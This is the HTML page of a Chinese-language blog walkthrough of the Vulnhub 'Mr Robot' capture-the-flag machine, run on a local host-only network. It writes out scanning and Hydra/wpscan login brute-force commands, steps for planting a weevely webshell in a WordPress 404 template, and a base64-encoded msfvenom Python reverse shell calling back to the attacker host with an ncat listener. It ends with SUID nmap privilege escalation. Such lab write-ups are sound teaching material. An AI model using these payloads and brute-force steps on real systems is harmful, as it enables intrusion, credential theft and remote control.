@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub - Mr Robot - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="靶机信息 下载地址 https://www.vulnhub.com/entry/mr-robot-1,151/ 目标 靶机内藏有 3 个 key，需要全部获得，而难度逐渐递增。 环境介绍 名称 介绍 主机 Manjaro 20.0.3 虚拟化软件 Virtualbox 6.1.10 网络类型 Host-Only (vboxnet0) 基本信息收集 靶机" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/2020-08-10-vulnhub-mr-robot/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub - Mr Robot" />
+<meta property="og:description" content="靶机信息 下载地址 https://www.vulnhub.com/entry/mr-robot-1,151/ 目标 靶机内藏有 3 个 key，需要全部获得，而难度逐渐递增。 环境介绍 名称 介绍 主机 Manjaro 20.0.3 虚拟化软件 Virtualbox 6.1.10 网络类型 Host-Only (vboxnet0) 基本信息收集 靶机" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/2020-08-10-vulnhub-mr-robot/" />
+<meta property="article:published_time" content="2020-08-10T09:24:54+00:00" />
+<meta property="article:modified_time" content="2020-08-10T09:24:54+00:00" />
+<meta itemprop="name" content="Vulnhub - Mr Robot">
+<meta itemprop="description" content="靶机信息 下载地址 https://www.vulnhub.com/entry/mr-robot-1,151/ 目标 靶机内藏有 3 个 key，需要全部获得，而难度逐渐递增。 环境介绍 名称 介绍 主机 Manjaro 20.0.3 虚拟化软件 Virtualbox 6.1.10 网络类型 Host-Only (vboxnet0) 基本信息收集 靶机">
+<meta itemprop="datePublished" content="2020-08-10T09:24:54+00:00" />
+<meta itemprop="dateModified" content="2020-08-10T09:24:54+00:00" />
+<meta itemprop="wordCount" content="2141">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub - Mr Robot"/>
+<meta name="twitter:description" content="靶机信息 下载地址 https://www.vulnhub.com/entry/mr-robot-1,151/ 目标 靶机内藏有 3 个 key，需要全部获得，而难度逐渐递增。 环境介绍 名称 介绍 主机 Manjaro 20.0.3 虚拟化软件 Virtualbox 6.1.10 网络类型 Host-Only (vboxnet0) 基本信息收集 靶机"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Even</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Even</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub - Mr Robot</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-08-10 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#靶机信息">靶机信息</a>
+          <ul>
+            <li><a href="#下载地址">下载地址</a></li>
+            <li><a href="#目标">目标</a></li>
+            <li><a href="#环境介绍">环境介绍</a></li>
+          </ul>
+        </li>
+        <li><a href="#基本信息收集">基本信息收集</a>
+          <ul>
+            <li><a href="#靶机运行">靶机运行</a></li>
+            <li><a href="#获取-ip-地址">获取 IP 地址</a></li>
+          </ul>
+        </li>
+        <li><a href="#端口扫描及服务枚举">端口扫描及服务枚举</a></li>
+        <li><a href="#web-枚举">Web 枚举</a>
+          <ul>
+            <li><a href="#浏览网页">浏览网页</a></li>
+            <li><a href="#web-路径扫描">Web 路径扫描</a></li>
+            <li><a href="#wordpress-枚举">Wordpress 枚举</a></li>
+          </ul>
+        </li>
+        <li><a href="#上传-webshell">上传 webshell</a>
+          <ul>
+            <li><a href="#生成-webshell">生成 webshell</a></li>
+            <li><a href="#修改-404-页面">修改 404 页面</a></li>
+            <li><a href="#连接-webshell">连接 webshell</a></li>
+            <li><a href="#创建-python-reverse-shell">创建 Python reverse shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#收集主机信息">收集主机信息</a></li>
+        <li><a href="#权限提升">权限提升</a></li>
+        <li><a href="#参考链接">参考链接</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="靶机信息">靶机信息</h2>
+<h3 id="下载地址">下载地址</h3>
+<p><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a></p>
+<h3 id="目标">目标</h3>
+<p>靶机内藏有 3 个 key，需要全部获得，而难度逐渐递增。</p>
+<h3 id="环境介绍">环境介绍</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">主机</td>
+<td style="text-align:left">Manjaro 20.0.3</td>
+</tr>
+<tr>
+<td style="text-align:left">虚拟化软件</td>
+<td style="text-align:left">Virtualbox 6.1.10</td>
+</tr>
+<tr>
+<td style="text-align:left">网络类型</td>
+<td style="text-align:left">Host-Only (vboxnet0)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="基本信息收集">基本信息收集</h2>
+<h3 id="靶机运行">靶机运行</h3>
+<p>靶机直接运行需要账号密码来登陆，界面如下：</p>
+<p><img src="/images/2020-08-09/mrrobot.webp" alt="mrrobot"></p>
+<h3 id="获取-ip-地址">获取 IP 地址</h3>
+<p>使用 <strong>arp-scan</strong> 扫描存活的主机，这个命令需要 <strong>sudo</strong> 执行：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo arp-scan -I vboxnet0 --localnet
+</code></pre></td></tr></table>
+</div>
+</div><p>Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 192.168.56.1
+Starting arp-scan 1.9.7 with 256 hosts (<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)
+192.168.56.100	08:00:27:27:20:4a	PCS Systemtechnik GmbH
+192.168.56.117	08:00:27:ea:45:3e	PCS Systemtechnik GmbH</p>
+<p>2 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 2.061 seconds (124.21 hosts/sec). 2 responded
+{% endblockquote %}</p>
+<p>Virtualbox 的 <strong>Host-Only</strong> 网络适配器 DHCP 的地址为 <strong>192.168.56.100</strong>，故靶机的地址为 <strong>192.168.56.117</strong>。</p>
+<h2 id="端口扫描及服务枚举">端口扫描及服务枚举</h2>
+<p>使用 <strong>Nmap</strong> 对靶机进行全 <strong>TCP</strong> 端口扫描，并指定 <strong>-sV</strong> 参数进行服务识别：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -p- 192.168.56.117
+</code></pre></td></tr></table>
+</div>
+</div><p>Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-08-09 08:45 UTC
+Nmap scan report for 192.168.56.117
+Host is up (0.00051s latency).
+Not shown: 65532 filtered ports
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+MAC Address: 08:00:27:EA:45:3E (Oracle VirtualBox virtual NIC)</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 117.36 seconds
+{% endblockquote %}</p>
+<p>从 <strong>Nmap</strong> 的结果可知靶机只开放了 80 和 443 端口，其上运行着 Apache。</p>
+<h2 id="web-枚举">Web 枚举</h2>
+<h3 id="浏览网页">浏览网页</h3>
+<p>页面模拟了一个终端，可以输入几个指定的命令，大都是 <strong>Mr Robot</strong> 的剧情回顾。命令全部尝试了一次，没有有用的信息。</p>
+<h3 id="web-路径扫描">Web 路径扫描</h3>
+<p>这里我还是使用 <strong>rustbuster</strong> 来扫描路径，得到以下的结果：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">rustbuster -u http://192.168.56.117 -w /usr/share/dirb/wordlists/common.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>## RustBuster ##</p>
+<p>Total paths to be checked: 4617
+Threads: 12</p>
+<p>http://192.168.56.117/.hta 403 Forbidden
+http://192.168.56.117/.htaccess 403 Forbidden
+http://192.168.56.117/.htpasswd 403 Forbidden
+http://192.168.56.117/favicon.ico 200 OK
+http://192.168.56.117/login 302 Found
+http://192.168.56.117/feed 301 Moved Permanently
+http://192.168.56.117/image 301 Moved Permanently
+http://192.168.56.117/Image 301 Moved Permanently
+http://192.168.56.117/video 301 Moved Permanently
+http://192.168.56.117/images 301 Moved Permanently
+http://192.168.56.117/index.html 200 OK
+http://192.168.56.117/index.php 301 Moved Permanently
+http://192.168.56.117/atom 301 Moved Permanently
+http://192.168.56.117/audio 301 Moved Permanently
+http://192.168.56.117/0 301 Moved Permanently
+http://192.168.56.117/page1 301 Moved Permanently
+http://192.168.56.117/intro 200 OK
+http://192.168.56.117/rdf 301 Moved Permanently
+http://192.168.56.117/readme 200 OK
+http://192.168.56.117/sitemap 200 OK
+http://192.168.56.117/sitemap.xml 200 OK
+http://192.168.56.117/js 301 Moved Permanently
+http://192.168.56.117/wp-admin 301 Moved Permanently
+http://192.168.56.117/blog 301 Moved Permanently
+http://192.168.56.117/phpmyadmin 403 Forbidden
+http://192.168.56.117/wp-config 200 OK
+http://192.168.56.117/wp-content 301 Moved Permanently
+http://192.168.56.117/wp-cron 200 OK
+http://192.168.56.117/wp-includes 301 Moved Permanently
+http://192.168.56.117/wp-links-opml 200 OK
+http://192.168.56.117/wp-load 200 OK
+http://192.168.56.117/wp-login 200 OK
+http://192.168.56.117/admin 301 Moved Permanently
+http://192.168.56.117/css 301 Moved Permanently
+http://192.168.56.117/license 200 OK
+http://192.168.56.117/robots 200 OK
+http://192.168.56.117/robots.txt 200 OK
+http://192.168.56.117/rss 301 Moved Permanently
+http://192.168.56.117/rss2 301 Moved Permanently
+http://192.168.56.117/dashboard 302 Found
+{% endblockquote %}</p>
+<p>可以找到一些有趣的条目，如 <strong>robots.txt</strong>，<strong>readme</strong>，<strong>license</strong>，还有一大堆 <strong>wp</strong> 打头的页面。其中 <strong>readme</strong> 的内容没啥帮助，大意为方向正确；而 <strong>license</strong> 直接嘲讽 (Script kitty？？)。最终在 <strong>robots.txt</strong> 中发现以下内容：</p>
+<p>{% blockquote %}
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+{% endblockquote %}</p>
+<p>成功找到第一个 key，直接访问 <strong>http://192.168.56.117/key-1-of-3.txt</strong> 就可以得到。而另一个文件 <strong>fsocity.dic</strong> 根据内容推测这是一个字典，先下载下来备用。</p>
+<h3 id="wordpress-枚举">Wordpress 枚举</h3>
+<p>访问 <strong>wp-login.php</strong>，可以发现这是一个 <strong>wordpress</strong> 站点 (头一次碰见，大佬们轻喷)。使用 <strong>wpscan</strong> 扫描器进行扫描：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">wpscan --url 192.168.56.117
+</code></pre></td></tr></table>
+</div>
+</div><p>[+] URL: http://192.168.56.117/ [192.168.56.117]
+[+] Started: Sun Aug  9 17:57:24 2020</p>
+<p>Interesting Finding(s):</p>
+<p>[+] Headers
+| Interesting Entries:
+|  - Server: Apache
+|  - X-Mod-Pagespeed: 1.9.32.3-4523
+| Found By: Headers (Passive Detection)
+| Confidence: 100%</p>
+<p>[+] http://192.168.56.117/robots.txt
+| Found By: Robots Txt (Aggressive Detection)
+| Confidence: 100%</p>
+<p>[+] XML-RPC seems to be enabled: http://192.168.56.117/xmlrpc.php
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 100%
+| References:
+|  - <a href="http://codex.wordpress.org/XML-RPC_Pingback_API">http://codex.wordpress.org/XML-RPC_Pingback_API</a>
+|  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</a>
+|  - <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos">https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</a>
+|  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</a>
+|  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</a></p>
+<p>[+] The external WP-Cron seems to be enabled: http://192.168.56.117/wp-cron.php
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 60%
+| References:
+|  - <a href="https://www.iplocation.net/defend-wordpress-from-ddos">https://www.iplocation.net/defend-wordpress-from-ddos</a>
+|  - <a href="https://github.com/wpscanteam/wpscan/issues/1299">https://github.com/wpscanteam/wpscan/issues/1299</a></p>
+<p>[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+| Found By: Rss Generator (Aggressive Detection)
+|  - http://192.168.56.117/feed/, <generator><a href="http://wordpress.org/?v=4.3.1">http://wordpress.org/?v=4.3.1</a></generator>
+|  - http://192.168.56.117/comments/feed/, <generator><a href="http://wordpress.org/?v=4.3.1">http://wordpress.org/?v=4.3.1</a></generator></p>
+<p>[i] The main theme could not be detected.</p>
+<p>[+] Enumerating All Plugins (via Passive Methods)</p>
+<p>[i] No plugins Found.</p>
+<p>[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+Checking Config Backups - Time: 00:00:00 &lt;===================================================&gt; (21 / 21) 100.00% Time: 00:00:00</p>
+<p>[i] No Config Backups Found.
+{% endblockquote %}</p>
+<p>顺着这些信息逐条分析，并没有发现有漏洞的主题或是插件。倒是可以直接访问 <strong>xmlrpc.php</strong>，能够绕过安全限制进行爆破。结合上一步得到的字典，直接暴力破解用户名和密码。<strong>Wordpress</strong> 登陆界面有一个有趣的现象，输入不存在的用户名会有相应的提示，从而为爆破用户名，继而爆破密码创造了极大的便利。</p>
+<h4 id="爆破用户名">爆破用户名</h4>
+<p>这里我使用 <strong>Hydra</strong> 进行爆破，使用之前得到的 <strong>fsociety.dic</strong> 作为字典，而密码随便填一个就好，反正只是起占位作用。注意最后一个参数，结构是：&ldquo;路径:user=^USER^&amp;pass=^PASS^:错误信息&rdquo;，其中 <strong>user</strong> 和 <strong>pass</strong> 替换成 form 中对应的 <strong>id</strong>：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">hydra -L fsocity.dic -p <span class="nb">test</span> 192.168.56.117 http-post-form <span class="s1">&#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username.&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2020-08-09 18:36:41
+[WARNING] Restorefile (you have 10 seconds to abort&hellip; (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
+[DATA] attacking http-post-form://192.168.56.117:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username.
+[80][http-post-form] host: 192.168.56.117   login: <font color=RED>Elliot</font>   password: <font color=RED>test</font>
+{% endblockquote %}</p>
+<p>爆破出一个用户名就够用了，后续继续爆破出的用户名表明 <strong>Elliot</strong> 似乎不区分大小写。</p>
+<h4 id="爆破密码">爆破密码</h4>
+<p>继续使用 <strong>fsociety.dic</strong> 作为字典来爆破密码，这里我使用 <strong>wpscan</strong> 来爆破，<strong>hydra</strong> 同样也可以</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">wpscan --url http://192.168.56.117 -P ./fsocity.dic -U elliot -t <span class="m">1000</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>&hellip; &hellip;
+[+] Performing password attack on Xmlrpc Multicall against 1 user/s
+Progress Time: 00:42:21 &lt;=================================================================&gt; (1716 / 1716) 100.00% Time: 00:42:21
+WARNING: Your progress bar is currently at 1716 out of 1716 and cannot be incremented. In v2.0.0 this will become a ProgressBar::InvalidProgressError.
+Progress Time: 00:42:22 &lt;=================================================================&gt; (1716 / 1716) 100.00% Time: 00:42:22
+[SUCCESS] - elliot / ER28-0652
+All Found</p>
+<p>[!] Valid Combinations Found:
+| Username: elliot, Password: ER28-0652
+{% endblockquote %}</p>
+<p>至此，使用得到的用户名密码登录：</p>
+<p><img src="/images/2020-08-09/wordpress.webp" alt="wordpress"></p>
+<h2 id="上传-webshell">上传 webshell</h2>
+<p>这里我利用主题的 404 页面可以随便编辑的特性，将当前主题的 <strong>404</strong> 页面改为 <strong>weevely</strong> 生成的 <strong>webshell</strong>：</p>
+<h3 id="生成-webshell">生成 webshell</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">weevely generate <span class="m">123456</span> /tmp/webshell.php
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="修改-404-页面">修改 404 页面</h3>
+<p>选择 <strong>Apperance</strong> &ndash;&gt; <strong>Editor</strong>，复制 webshell 的内容，点击 <strong>Upload File</strong>：</p>
+<p><img src="/images/2020-08-09/webshell.webp" alt="webshell"></p>
+<h3 id="连接-webshell">连接 webshell</h3>
+<p>使用 <strong>weevely</strong> 连接至 <strong>webshell</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">weevely http://192.168.56.117/wp-content/themes/twentyfifteen/404.php <span class="m">123456</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-08-09/webshell_connect.webp" alt="webshell_connect"></p>
+<p>经过一番试验，发现这个 <strong>webshell</strong> 存在很大的局限，没办法执行交互式命令，也没办法执行 <strong>su</strong>，还得想办法得到一个交互式的 <strong>shell</strong> 才行。</p>
+<h3 id="创建-python-reverse-shell">创建 Python reverse shell</h3>
+<p>经过一番侦察发现靶机上有 python、perl 的环境，这里利用我利用 python 创建 reverse shell。为了方便直接用 <strong>msfvemon</strong> 生成：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p cmd/unix/reverse_python <span class="nv">LHOST</span><span class="o">=</span>192.168.56.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">3333</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>python -c &ldquo;exec(<strong>import</strong>(&lsquo;base64&rsquo;).b64decode(<strong>import</strong>(&lsquo;codecs&rsquo;).getencoder(&lsquo;utf-8&rsquo;)(&lsquo;aW1wb3J0IHNvY2tldCAgICAgICAsICAgICBzdWJwcm9jZXNzICAgICAgICwgICAgIG9zOyAgaG9zdD0iMTkyLjE2OC41Ni4xIjsgIHBvcnQ9MzMzMzsgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAsICAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgcy5jb25uZWN0KChob3N0ICAgICAgICwgICAgIHBvcnQpKTsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAsICAgICAwKTsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAsICAgICAxKTsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAsICAgICAyKTsgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))&rdquo;
+{% endblockquote %}</p>
+<p>本机使用 <strong>ncat</strong> 监听 <strong>3333</strong> 端口，在 webshell 中执行以上生成的命令，成功连接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ncat -lp <span class="m">3333</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>本步骤最后调用 Python 的 pty 库，得到一个 terminal：</p>
+<p><img src="/images/2020-08-09/python_reverse.webp" alt="python_reverse"></p>
+<h2 id="收集主机信息">收集主机信息</h2>
+<p>当前的用户为 <strong>daemon</strong>，首先看看系统中的用户和目录信息：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">cat /etc/passwd <span class="p">|</span> awk -F: <span class="s1">&#39;$3 &gt;= 1000 {print $1, $6}&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>nobody /nonexistent
+bitnamiftp /opt/bitnami/apps
+mysql /home/mysql
+robot /home/robot
+{% endblockquote%}</p>
+<p>查看 <strong>/home</strong>，只有 <strong>robot</strong> 一个文件夹，其内有第二个 key，但是当前的用户没有读的权限，但是还有一个保存着 robot 用户密码 md5 的文件可以读取，直接利用 <a href="https://crackstation.net/"><strong>在线 md5</strong></a> 破解：</p>
+<p><img src="/images/2020-08-09/md5.webp" alt="md5"></p>
+<p>得到密码，使用 su 切换用户，直接可以读取 <strong>key-2-of-3.txt</strong>。</p>
+<h2 id="权限提升">权限提升</h2>
+<p>还是最后一个 key，继续侦察。查看具有 SUID 权限的文件：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">find / -perm -4000 2&gt;/dev/null
+</code></pre></td></tr></table>
+</div>
+</div><p>/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+{% endblockquote %}</p>
+<p>有 Nmap，查看 Nmap 版本：</p>
+<p><img src="/images/2020-08-09/nmap.webp" alt="nmap"></p>
+<p>可见 Nmap 版本较低，直接开启交互模式来执行 shell 命令：</p>
+<p><img src="/images/2020-08-09/nmap_shell.webp" alt="nmap_shell"></p>
+<p>成功获得 <strong>root</strong> 权限，拿到第三个 key。</p>
+<h2 id="参考链接">参考链接</h2>
+<ol>
+<li>
+<p><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">WordPress Reverse Shell</a></p>
+</li>
+<li>
+<p><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/">https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/</a></p>
+</li>
+<li>
+<p><a href="https://linuxhint.com/crack-web-based-login-page-with-hydra-in-kali-linux/">https://linuxhint.com/crack-web-based-login-page-with-hydra-in-kali-linux/</a></p>
+</li>
+</ol>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2020-08-10
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/2020-08-16-linux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%B9%E5%87%BA%E5%8F%AF%E7%A7%BB%E5%8A%A8%E7%A3%81%E7%9B%98/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Linux 命令行弹出可移动磁盘</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/2020-08-04-vulnhub-kioptrix-4/">
+            <span class="next-text nav-default">Vulnhub-Kioptrix_level_4</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
